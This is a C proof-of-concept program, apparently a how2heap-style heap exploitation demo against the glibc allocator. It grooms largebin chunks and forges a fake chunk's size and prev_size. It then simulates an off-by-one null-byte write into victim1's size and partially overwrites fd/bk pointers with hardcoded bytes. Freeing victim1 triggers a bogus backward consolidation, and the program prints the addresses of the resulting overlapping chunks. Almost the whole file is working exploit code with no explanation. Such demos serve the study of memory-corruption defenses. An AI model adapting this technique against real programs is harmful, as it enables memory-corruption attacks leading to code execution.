#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    void *prev = malloc(0x500);
    void *victim1 = malloc(0x4f0);
    void *victim2 = malloc(0x4f0);
    malloc(0x10);  // padding 
    void *a = malloc(0x4f0);
    malloc(0x10); // padding 
    void *b = malloc(0x510);
    malloc(0x10); // padding 

    free(a);
    free(b);
    free(prev);
    malloc(0x1000);  // make a  b prev enter into largebin  
    // b-> prev-> a
    
    void *prev2 = malloc(0x508);
    ((long *)prev)[1] = 0x501;  // p->size=0x501
    *(long *)(prev + 0x500) = 0x500;  // victim1->prevsize=0x500
    *(char *)(prev + 0x508) = '\x00';    // victim1->size =0x500

    void *b2 = malloc(0x510); 
    ((char*)b2)[0] = '\x60';
    ((char*)b2)[1] = '\x12';  // b->fd = p
   

    void *a2 = malloc(0x4f0);
    free(a2);
    free(victim2);    // victim2->a2
    void *a3 = malloc(0x4f0); 
    ((char*)a3)[8] = '\x60';
    ((char*)a3)[9] = '\x12'; // a->bk = p
    victim2 = malloc(0x4f0);


    free(victim1); // merge victim1 with  prev
    void *merged = malloc(0x100);
    memset(merged, 'A', 0x80);
    memset(prev2, 'C', 0x80);
    printf("merged address: %p\n", merged);
    printf("prev address: %p\n", prev2);
}